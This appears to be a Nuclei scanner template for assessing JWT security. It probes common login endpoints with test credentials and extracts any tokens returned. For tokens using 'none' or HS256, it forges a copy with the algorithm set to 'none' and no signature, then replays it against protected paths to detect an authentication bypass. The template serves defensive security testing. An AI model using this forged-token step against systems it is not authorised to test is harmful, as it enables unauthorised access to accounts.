flow: "// Initialize JWT discovery endpoints\ntemplate[\"jwt_endpoints\"] = [\n  \"\
  /api/auth/login\",\n  \"/oauth/token\",\n  \"/auth/jwt\",\n  \"/api/token\",\n \
  \ \"/login\"\n];\n\n// Test login endpoints for JWT token discovery\nhttp(\"login-discovery\"\
  );\n\n// Extract and analyze JWT tokens from responses\nlet tokens = [];\nif (template[\"\
  login_response\"]) {\n  const jwtRegex = /eyJ[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]*/g;\n\
  \  const bodyTokens = template[\"login_response\"].match(jwtRegex) || [];\n  tokens\
  \ = tokens.concat(bodyTokens);\n}\ntemplate[\"jwt_tokens\"] = tokens;\n\n// Analyze\
  \ each discovered JWT token\nfor (let token of iterate(template[\"jwt_tokens\"]))\
  \ {\n  set(\"current_token\", token);\n\n  // Decode JWT header to identify algorithm\n\
  \  if (token) {\n    try {\n      const parts = token.split('.');\n      if (parts.length\
  \ === 3) {\n        const header = JSON.parse(atob(parts[0]));\n        template[\"\
  jwt_algorithm\"] = header.alg;\n        template[\"jwt_typ\"] = header.typ;\n\n\
  \        // Check for vulnerable algorithms\n        const vulnerableAlgs = [\"\
  none\", \"HS256\"];\n        template[\"vulnerable_alg\"] = vulnerableAlgs.indexOf(header.alg)\
  \ !== -1;\n\n        // Test token validation\n        http(\"token-validation\"\
  );\n\n        // Test algorithm manipulation if vulnerable\n        if (template[\"\
  vulnerable_alg\"]) {\n          // Create manipulated token for security testing\n\
  \          const manipulatedHeader = JSON.stringify(Object.assign(header, {\"alg\"\
  : \"none\"}));\n          const encodedHeader = btoa(manipulatedHeader);\n     \
  \     set(\"manipulated_token\", encodedHeader + \".\" + parts[1] + \".\");\n\n\
  \          http(\"algorithm-manipulation\");\n        }\n      }\n    } catch (e)\
  \ {\n      template[\"jwt_algorithm\"] = \"unknown\";\n    }\n  }\n}\n"
http:
- body: 'username=test&password=test

    '
  extractors:
  - internal: true
    name: login_response
    regex:
    - (?s).*
    type: regex
  headers:
    Content-Type: application/x-www-form-urlencoded
  id: login-discovery
  matchers:
  - internal: true
    status:
    - 200
    - 400
    - 401
    type: status
  matchers-condition: and
  method: POST
  path:
  - '{{BaseURL}}/api/auth/login'
  - '{{BaseURL}}/oauth/token'
  - '{{BaseURL}}/auth/jwt'
  - '{{BaseURL}}/api/token'
  - '{{BaseURL}}/login'
- extractors:
  - internal: true
    name: token_validation_status
    regex:
    - HTTP/\d\.\d\s+(\d+)
    type: regex
  headers:
    Authorization: Bearer {{current_token}}
  id: token-validation
  matchers:
  - internal: true
    status:
    - 200
    type: status
  method: GET
  path:
  - '{{BaseURL}}/api/user/profile'
  - '{{BaseURL}}/dashboard'
  - '{{BaseURL}}/api/protected'
- headers:
    Authorization: Bearer {{manipulated_token}}
  id: algorithm-manipulation
  matchers:
  - name: algorithm_bypass_successful
    status:
    - 200
    type: status
  method: GET
  path:
  - '{{BaseURL}}/api/user/profile'
  - '{{BaseURL}}/dashboard'
id: flow-adaptive-jwt-security
info:
  author: geeknik
  description: 'Comprehensive JWT security analysis using Flow Protocol for dynamic
    token discovery,

    algorithm identification, and vulnerability assessment. This template performs

    progressive JWT analysis including token extraction, algorithm detection, and

    security validation while maintaining defensive research principles.

    '
  name: Adaptive JWT Security Assessment Flow
  reference:
  - https://tools.ietf.org/html/rfc7519
  - https://owasp.org/www-project-web-security-testing-guide/
  severity: medium
  tags: jwt,flow,security-assessment,authentication,defensive
